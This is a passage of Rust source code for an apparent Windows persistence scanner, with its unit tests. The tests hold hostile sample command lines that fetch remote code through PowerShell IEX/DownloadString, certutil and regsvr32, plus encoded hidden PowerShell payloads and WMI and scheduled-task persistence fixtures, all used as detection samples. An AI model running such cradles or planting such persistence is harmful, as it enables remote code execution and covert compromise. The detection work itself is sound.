                severity = severity.escalate(Severity::Medium);
            }

            if severity != Severity::Low {
                let mut evidence = vec![format!("{} ({}) -> {}", s.name, s.display_name.clone().unwrap_or_default(), s.path_name)];
                evidence.extend(line);
                if let Some(m) = &s.start_mode {
                    evidence.push(format!("start mode: {m}"));
                }
                out.push(
                    Finding::new(
                        format!("persistence-service:{}", s.name),
                        severity,
                        "persistence",
                        format!("Service \"{}\" runs an untrusted binary", s.name),
                        format!(
                            "Services start before you log in and usually run as SYSTEM, \
                             which makes them the most powerful persistence available. \
                             This one was flagged because {}.",
                            join_reasons(&reasons)
                        ),
                    )
                    .with_evidence(evidence)
                    .with_remediation(Remediation::StopAndDisableService {
                        name: s.name.clone(),
                    }),
                );
            }
        }

        if has_unquoted_path_with_spaces(&s.path_name) {
            out.push(
                Finding::new(
                    format!("persistence-service-unquoted:{}", s.name),
                    // Watching, not a finding. By its own description this is a
                    // latent bug in whoever wrote the installer, present on
                    // essentially every Windows machine with third-party
                    // software. Reporting dozens of these at Medium buried the
                    // things that actually mattered.
                    Severity::Info,
                    "persistence",
                    format!("Service \"{}\" has an unquoted path with spaces", s.name),
                    "Windows resolves an unquoted service path by trying each \
                     space-separated prefix in turn, so a file named like \
                     C:\\Program.exe would be launched as SYSTEM instead of the real \
                     service. This is a latent privilege-escalation bug in whichever \
                     program installed the service, not evidence of compromise by \
                     itself.",
                )
                .with_evidence(vec![format!("{} -> {}", s.name, s.path_name)])
                .with_remediation(Remediation::Manual {
                    instructions: format!(
                        "Quote the ImagePath for the {} service: \
                         HKLM\\SYSTEM\\CurrentControlSet\\Services\\{}\\ImagePath. \
                         Reporting it to the vendor is the durable fix.",
                        s.name, s.name
                    ),
                }),
            );
        }
    }

    out
}

/// Bindings that ship with Windows or with common management agents.
const BENIGN_WMI: &[&str] = &[
    "bvtfilter",
    "bvtconsumer",
    "scm event log filter",
    "scm event log consumer",
];

/// WMI permanent event subscriptions.
///
/// A filter (a WQL query, e.g. "every 60 seconds") bound to a consumer (a
/// command line or a script body) is code that runs with SYSTEM privileges,
/// stores nothing in the file system, and is invisible to every autostart list
/// in the Windows UI. There is essentially no consumer software that uses this,
/// so anything here that is not a known management agent deserves attention.
pub fn analyze_wmi(entries: &[WmiEntry]) -> Vec<Finding> {
    let mut out = Vec::new();

    for e in entries {
        let name_lower = e.name.to_ascii_lowercase();
        let detail_lower = e.detail.to_ascii_lowercase();
        if BENIGN_WMI.iter().any(|b| name_lower.contains(b))
            || BENIGN_WMI.iter().any(|b| detail_lower.contains(b))
        {
            continue;
        }

        let is_consumer = e.kind.ends_with("EventConsumer");
        let is_binding = e.kind == "__FilterToConsumerBinding";
        if !is_consumer && !is_binding {
            // A filter on its own does nothing until it is bound; report the
            // binding and the consumer instead of triple-counting.
            continue;
        }

        // A consumer whose payload is obfuscated is not ambiguous. Everything
        // else here is High rather than Critical because management agents
        // (SCCM, some OEM tooling) do legitimately register subscriptions.
        let indicators = command_indicators(&e.detail);
        let severity = if has_high_signal(&indicators) {
            Severity::Critical
        } else {
            Severity::High
        };

        let mut evidence = vec![format!("{}: {}", e.kind, e.name)];
        if !e.detail.trim().is_empty() {
            evidence.push(truncate(&e.detail, 400));
        }
        evidence.extend(indicator_evidence(&indicators));

        out.push(
            Finding::new(
                format!("persistence-wmi:{}:{}", e.kind, e.name),
                severity,
                "persistence",
                "A WMI event subscription is registered",
                "WMI permanent event subscriptions run code as SYSTEM when a condition \
                 is met — a timer, a process starting, a user logging on — without any \
                 file in a Startup folder or any entry in the registry's Run keys. \
                 Almost nothing legitimate on a personal machine uses this, and it is a \
                 favourite of malware that wants to survive being cleaned. Unless you \
                 recognise it as part of a monitoring or management agent, treat it as \
                 hostile.",
            )
            .with_evidence(evidence)
            .with_remediation(Remediation::Manual {
                instructions: format!(
                    "From an elevated PowerShell, inspect it with \
                     `Get-CimInstance -Namespace root\\subscription -ClassName {}` and, \
                     once you are sure, remove the binding, the consumer and the filter \
                     with Remove-CimInstance. This tool will not delete WMI objects \
                     automatically because removing the wrong one can break Windows \
                     management.",
                    e.kind
                ),
            }),
        );
    }

    out
}

/// Shorten long evidence (a script body) without losing the beginning.
fn truncate(s: &str, max: usize) -> String {
    let s = s.trim();
    if s.chars().count() <= max {
        return s.to_string();
    }
    let cut: String = s.chars().take(max).collect();
    format!("{cut}… (truncated)")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::security::{trust_map, FileTrust};

    fn unsigned(path: &str) -> FileTrust {
        FileTrust {
            path: path.into(),
            exists: true,
            status: "NotSigned".into(),
            signer: None,
        }
    }

    fn signed(path: &str) -> FileTrust {
        FileTrust {
            path: path.into(),
            exists: true,
            status: "Valid".into(),
            signer: Some("CN=Microsoft Corporation".into()),
        }
    }

    fn missing(path: &str) -> FileTrust {
        FileTrust {
            path: path.into(),
            exists: false,
            status: "Missing".into(),
            signer: None,
        }
    }

    #[test]
    fn extracts_quoted_paths_with_spaces() {
        assert_eq!(
            extract_target_path(r#""C:\Program Files\App\app.exe" --minimized"#).unwrap(),
            r"C:\Program Files\App\app.exe"
        );
    }

    #[test]
    fn extracts_unquoted_paths_with_spaces() {
        // The naive "first token" approach returns "C:\Program", which then
        // looks like a missing file and produces a false positive on half the
        // machine's autostart entries.
        assert_eq!(
            extract_target_path(r"C:\Program Files\App\app.exe /background").unwrap(),
            r"C:\Program Files\App\app.exe"
        );
        assert_eq!(
            extract_target_path(r"C:\Windows\system32\userinit.exe,").unwrap(),
            r"C:\Windows\system32\userinit.exe"
        );
    }

    #[test]
    fn extracts_the_loader_from_a_rundll32_line() {
        assert_eq!(
            extract_target_path(r"rundll32.exe C:\Users\bob\AppData\Roaming\x.dll,Start").unwrap(),
            "rundll32.exe"
        );
    }

    #[test]
    fn extraction_handles_junk_without_panicking() {
        assert_eq!(extract_target_path(""), None);
        assert_eq!(extract_target_path("   "), None);
        assert_eq!(extract_target_path("\""), None);
        assert_eq!(extract_target_path("notepad").unwrap(), "notepad");
    }

    #[test]
    fn obfuscated_powershell_is_high_signal() {
        let cmd = "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A";
        let ind = command_indicators(cmd);
        assert!(has_high_signal(&ind));
        assert!(ind.iter().any(|i| i.label.contains("base64")));
        assert!(ind.iter().any(|i| i.label.contains("hidden window")));
    }

    #[test]
    fn download_cradles_are_high_signal() {
        for cmd in [
            "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://x/y')",
            "cmd /c certutil -urlcache -split -f http://x/y.exe %temp%\\y.exe",
            "regsvr32 /s /n /u /i:http://x/y.sct scrobj.dll",
            "powershell -e JABjAGwAaQBlAG4AdAA=",
        ] {
            assert!(
                has_high_signal(&command_indicators(cmd)),
                "should be high signal: {cmd}"
            );
        }
    }

    #[test]
    fn ordinary_command_lines_are_not_high_signal() {
        for cmd in [
            r#""C:\Program Files\Steam\steam.exe" -silent"#,
            r#"C:\Windows\system32\cmd.exe /c echo hi"#,
            r#""C:\Users\bob\AppData\Local\Discord\Update.exe" --processStart Discord.exe"#,
        ] {
            assert!(
                !has_high_signal(&command_indicators(cmd)),
                "should not be high signal: {cmd}"
            );
        }
    }

    #[test]
    fn iex_matches_as_a_token_not_a_substring() {
        assert!(has_high_signal(&command_indicators("powershell -c iex $x")));
        assert!(has_high_signal(&command_indicators("powershell -c IEX($a)")));
        // A program that merely has those letters in its name is not a cradle.
        assert!(!has_high_signal(&command_indicators(
            r"C:\Program Files\Fiexplorer\fiex.exe"
        )));
    }

    #[test]
    fn lolbins_are_recognised_by_file_name() {
        assert!(is_lolbin(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"));
        assert!(is_lolbin("MSHTA.EXE"));
        assert!(!is_lolbin(r"C:\Program Files\App\app.exe"));
    }

    #[test]
    fn an_unsigned_appdata_run_key_with_encoded_args_is_critical() {
        let runs = vec![RunEntry {
            location: r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run".into(),
            name: "WindowsUpdater".into(),
            command: r"C:\Users\bob\AppData\Roaming\svchost.exe -w hidden -enc SQBFAFgA".into(),
        }];
        let trust = trust_map(vec![unsigned(r"C:\Users\bob\AppData\Roaming\svchost.exe")]);
        let f = analyze_runs(&runs, &trust);
        assert_eq!(f[0].severity, Severity::Critical);
        assert_eq!(f[0].category, "persistence");
        assert_eq!(
            f[0].remediation,
            Some(Remediation::DisableRunKey {
                hive: r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run".into(),
                name: "WindowsUpdater".into(),
            })
        );
        // Last finding is always the inventory.
        assert_eq!(f[1].id, "persistence-run-inventory");
        assert_eq!(f[1].severity, Severity::Info);
    }

    #[test]
    fn a_signed_program_files_run_key_produces_only_inventory() {
        let runs = vec![RunEntry {
            location: r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run".into(),
            name: "SecurityHealth".into(),
            command: r"%windir%\system32\SecurityHealthSystray.exe".into(),
        }];
        let trust = trust_map(vec![signed(r"%windir%\system32\SecurityHealthSystray.exe")]);
        let f = analyze_runs(&runs, &trust);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].id, "persistence-run-inventory");
    }

    #[test]
    fn an_autostart_pointing_at_a_deleted_file_is_reported() {
        let runs = vec![RunEntry {
            location: r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run".into(),
            name: "Ghost".into(),
            command: r"C:\Users\bob\AppData\Local\Temp\gone.exe".into(),
        }];
        let trust = trust_map(vec![missing(r"C:\Users\bob\AppData\Local\Temp\gone.exe")]);
        let f = analyze_runs(&runs, &trust);
        // Low, not Medium: an autostart whose target is gone executes nothing.
        // It is leftover mess worth cleaning up, not a live threat, and calling
        // it Medium alongside real findings is how a list becomes ignorable.
        assert_eq!(f[0].severity, Severity::Low);
        assert!(f[0].detail.contains("no longer exists"));
    }

    /// The rule that mattered most in practice: on a real machine, "unsigned
    /// and outside C:\Windows" describes games, launchers and anything the user
    /// built themselves. Alone it must not produce an actionable finding.
    #[test]
    fn unsigned_software_outside_system_dirs_is_not_by_itself_a_finding() {
        let runs = vec![RunEntry {
            location: r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run".into(),
            name: "MyTool".into(),
            command: r"C:\Tools\mytool.exe".into(),
        }];
        let trust = trust_map(vec![unsigned(r"C:\Tools\mytool.exe")]);
        let actionable: Vec<_> = analyze_runs(&runs, &trust)
            .into_iter()
            .filter(|f| f.severity != Severity::Info)
            .collect();
        assert!(
            actionable.is_empty(),
            "unsigned alone, in a non-user-writable location, is background noise; \
             got {actionable:?}"
        );
    }

    #[test]
    fn a_replaced_logon_shell_is_critical() {
        let w = WinlogonEntry {
            shell: Some(r"explorer.exe, C:\Users\bob\AppData\Roaming\ms.exe".into()),
            userinit: Some(r"C:\Windows\system32\userinit.exe,".into()),
            taskman: Some(String::new()),
            appinit_dlls: Some(String::new()),
        };
        let f = analyze_winlogon(&w);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].id, "persistence-winlogon-shell");
        assert_eq!(f[0].severity, Severity::Critical);
    }

    #[test]
    fn a_stock_winlogon_is_silent() {
        let w = WinlogonEntry {
            shell: Some("explorer.exe".into()),
            userinit: Some(r"C:\Windows\system32\userinit.exe,".into()),
            taskman: None,
            appinit_dlls: Some("  ".into()),
        };
        assert!(analyze_winlogon(&w).is_empty());
    }

    #[test]
    fn userinit_variants_are_recognised() {
        assert!(is_default_userinit(r"C:\Windows\system32\userinit.exe,"));
        assert!(is_default_userinit(r"C:\WINDOWS\System32\userinit.exe"));
        assert!(is_default_userinit(r"D:\Windows\system32\userinit.exe,"));
        assert!(!is_default_userinit(
            r"C:\Windows\system32\userinit.exe,C:\Users\bob\a.exe"
        ));
    }

    #[test]
    fn appinit_dlls_and_taskman_are_reported() {
        let w = WinlogonEntry {
            shell: Some("explorer.exe".into()),
            userinit: Some(r"C:\Windows\system32\userinit.exe,".into()),
            taskman: Some(r"C:\Users\bob\tm.exe".into()),
            appinit_dlls: Some(r"C:\Users\bob\hook.dll".into()),
        };
        let ids: Vec<String> = analyze_winlogon(&w).into_iter().map(|f| f.id).collect();
        assert!(ids.iter().any(|i| i == "persistence-winlogon-taskman"));
        assert!(ids.iter().any(|i| i == "persistence-appinit-dlls"));
    }

    #[test]
    fn scripts_in_the_startup_folder_are_flagged_but_shortcuts_are_not() {
        let files = vec![
            StartupFile {
                path: r"C:\Users\bob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.ps1".into(),
                location: "Startup".into(),
            },
            StartupFile {
                path: r"C:\Users\bob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Steam.lnk".into(),
                location: "Startup".into(),
            },
            StartupFile {
                path: r"C:\Users\bob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini".into(),
                location: "Startup".into(),
            },
        ];
        let f = analyze_startup(&files, &TrustMap::new());
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
        assert!(matches!(
            f[0].remediation,
            Some(Remediation::DeleteFile { .. })
        ));
    }

    #[test]
    fn microsoft_scheduled_tasks_are_not_flagged() {
        let tasks = vec![TaskEntry {
            task_path: r"\Microsoft\Windows\UpdateOrchestrator\".into(),
            task_name: "Schedule Scan".into(),
            state: Some("Ready".into()),
            author: Some("Microsoft Corporation".into()),
            actions: vec![TaskAction {
                execute: r"%systemroot%\system32\usoclient.exe".into(),
                arguments: Some("StartScan".into()),
            }],
        }];
        // %systemroot% is expanded during comparison, so this is recognised as
        // a system path and nothing is reported. Without that expansion every
        // Microsoft task on the machine would be a false positive.
        assert!(analyze_tasks(&tasks, &TrustMap::new()).is_empty());
    }

    #[test]
    fn an_obfuscated_scheduled_task_is_critical() {
        // Shape taken from a real commodity loader.
        let tasks = vec![TaskEntry {
            task_path: "\\".into(),
            task_name: "MicrosoftEdgeUpdateTaskMachineUA".into(),
            state: Some("Ready".into()),
            author: Some("bob".into()),
            actions: vec![TaskAction {
                execute: r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe".into(),
                arguments: Some(
                    "-NoProfile -WindowStyle Hidden -EncodedCommand \
                     SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
                        .into(),
                ),
            }],
        }];
        let trust = trust_map(vec![signed(
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        )]);
        let f = analyze_tasks(&tasks, &trust);
        assert_eq!(f.len(), 1);
        // Signed and in system32, but a LOLBin driven with an encoded command.
        assert_eq!(f[0].severity, Severity::Critical);
        assert_eq!(
            f[0].remediation,
            Some(Remediation::DisableScheduledTask {
                task_path: "\\MicrosoftEdgeUpdateTaskMachineUA".into()
            })
        );
        assert!(f[0].evidence.iter().any(|e| e.contains("author: bob")));
    }

    #[test]
    fn an_unsigned_service_in_appdata_is_high() {
        let services = vec![ServiceEntry {
            name: "WinHelpSvc".into(),
            display_name: Some("Windows Help Service".into()),
            path_name: r"C:\Users\bob\AppData\Local\Temp\helper.exe -k netsvcs".into(),
            start_mode: Some("Auto".into()),
            state: Some("Running".into()),
        }];
        let trust = trust_map(vec![unsigned(r"C:\Users\bob\AppData\Local\Temp\helper.exe")]);
        let f = analyze_services(&services, &trust);
        assert_eq!(f[0].severity, Severity::High);
        assert_eq!(
            f[0].remediation,
            Some(Remediation::StopAndDisableService {
                name: "WinHelpSvc".into()
            })
        );
    }

    #[test]
    fn a_normal_signed_service_is_silent() {
        let services = vec![ServiceEntry {
            name: "Dnscache".into(),
            display_name: Some("DNS Client".into()),
            path_name: r"C:\Windows\system32\svchost.exe -k NetworkService -p".into(),
            start_mode: Some("Auto".into()),
            state: Some("Running".into()),
        }];
        let trust = trust_map(vec![signed(r"C:\Windows\system32\svchost.exe")]);
        assert!(analyze_services(&services, &trust).is_empty());
    }

    #[test]
    fn unquoted_service_paths_with_spaces_are_detected() {
        assert!(has_unquoted_path_with_spaces(
            r"C:\Program Files\Vendor App\svc.exe"
        ));
        assert!(has_unquoted_path_with_spaces(
            r"C:\Program Files\Vendor App\svc.exe -run"
        ));
        // Quoted: fine.
        assert!(!has_unquoted_path_with_spaces(
            r#""C:\Program Files\Vendor App\svc.exe" -run"#
        ));
        // No spaces in the path: fine.
        assert!(!has_unquoted_path_with_spaces(
            r"C:\Windows\system32\svchost.exe -k netsvcs"
        ));
        // Kernel drivers use a different launch path.
        assert!(!has_unquoted_path_with_spaces(
            r"\SystemRoot\System32\drivers\my driver.sys"
        ));
    }

    #[test]
    fn a_command_line_wmi_consumer_is_critical() {
        let entries = vec![
            WmiEntry {
                kind: "__EventFilter".into(),
                name: "Updater".into(),
                detail: "SELECT * FROM __InstanceModificationEvent WITHIN 60".into(),
            },
            WmiEntry {
                kind: "CommandLineEventConsumer".into(),
                name: "Updater".into(),
                detail: "powershell.exe -nop -w hidden -enc SQBFAFgA".into(),
            },
            WmiEntry {
                kind: "__FilterToConsumerBinding".into(),
                name: r#"__EventFilter.Name="Updater""#.into(),
                detail: r#"CommandLineEventConsumer.Name="Updater""#.into(),
            },
        ];
        let f = analyze_wmi(&entries);
        // The bare filter is not counted on its own.
        assert_eq!(f.len(), 2);
        // The consumer carries the obfuscated payload, so it is Critical; the
        // binding that activates it is High.
        assert_eq!(f[0].severity, Severity::Critical);
        assert_eq!(f[1].severity, Severity::High);
        assert!(f[0].evidence.iter().any(|e| e.contains("-enc")));
    }

    #[test]
    fn stock_wmi_subscriptions_are_ignored() {
        let entries = vec![
            WmiEntry {
                kind: "__EventFilter".into(),
                name: "BVTFilter".into(),
                detail: "SELECT * FROM __InstanceModificationEvent".into(),
            },
            WmiEntry {
                kind: "NTEventLogEventConsumer".into(),
                name: "SCM Event Log Consumer".into(),
                detail: String::new(),
            },
        ];
        assert!(analyze_wmi(&entries).is_empty());
    }

    #[test]
    fn collect_paths_pulls_every_referenced_binary() {
        let s = PersistenceSnapshot {
            runs: vec![RunEntry {
                location: "L".into(),
                name: "N".into(),
                command: r#""C:\a\b.exe" -x"#.into(),
            }],
            winlogon: Some(WinlogonEntry {
                shell: Some("explorer.exe".into()),
                userinit: Some(r"C:\Windows\system32\userinit.exe,".into()),
                taskman: None,
                appinit_dlls: None,
            }),
            startup: vec![StartupFile {
                path: r"C:\s\x.ps1".into(),
                location: "S".into(),
            }],
            tasks: vec![TaskEntry {
                task_path: "\\".into(),
                task_name: "T".into(),
                state: None,
                author: None,
                actions: vec![TaskAction {
                    execute: r"C:\t\t.exe".into(),
                    arguments: None,
                }],
            }],
            services: vec![ServiceEntry {
                name: "S".into(),
                display_name: None,
                path_name: r"C:\v\v.exe -k".into(),
                start_mode: None,
                state: None,
            }],
            wmi: vec![],
        };
        let paths = collect_paths(&s);
        for expected in [
            r"C:\a\b.exe",
            r"C:\s\x.ps1",
            r"C:\t\t.exe",
            r"C:\v\v.exe",
            "explorer.exe",
        ] {
            assert!(paths.iter().any(|p| p == expected), "missing {expected}");
        }
    }

    #[test]
    fn a_realistic_snapshot_deserializes_from_powershell_json() {
        let json = r#"{"Runs":[{"location":"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","name":"Discord","command":"C:\\Users\\bob\\AppData\\Local\\Discord\\Update.exe --processStart Discord.exe"}],
        "Winlogon":{"shell":"explorer.exe","userinit":"C:\\Windows\\system32\\userinit.exe,","taskman":"","appinitDlls":""},
        "Startup":[],"Tasks":[{"taskPath":"\\","taskName":"T","state":"Ready","author":"bob","actions":[{"execute":"C:\\t.exe","arguments":""}]}],
        "Services":[{"name":"Dnscache","displayName":"DNS Client","pathName":"C:\\Windows\\system32\\svchost.exe -k NetworkService -p","startMode":"Auto","state":"Running"}],
        "Wmi":[]}"#;
        let s: PersistenceSnapshot = crate::security::parse_ps_object(json).unwrap();
        assert_eq!(s.runs.len(), 1);
        assert_eq!(s.tasks[0].actions[0].command_line(), r"C:\t.exe");
        assert_eq!(s.services[0].name, "Dnscache");
        assert_eq!(s.winlogon.unwrap().shell.unwrap(), "explorer.exe");
    }
}
